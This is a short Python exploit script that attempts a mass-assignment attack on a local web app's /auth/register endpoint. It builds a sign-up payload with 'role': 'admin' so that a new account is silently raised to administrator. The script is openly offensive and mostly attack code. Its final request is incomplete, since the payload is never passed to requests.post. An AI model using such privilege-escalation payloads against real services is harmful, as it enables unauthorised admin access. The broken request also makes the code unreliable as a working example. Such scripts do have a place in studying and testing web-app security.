import requests
import json
from colorama import Fore, Style, init

init()

BASE_URL = "http://localhost:3000"


def exploit_mass_assignment():
    print(
        f"{Fore.YELLOW}[*] Attempting mass assigment attack... {Style.RESET_ALL}")

    payload = {
        "username": "arioolnnn",
        "password": "password123",
        "email": "arioolnn@exapmle.com",
        "role": "admin",
        "ssn": "000-00-000"
    }

    response = requests.post(
        f"{BASE_URL}/auth/register"

    )
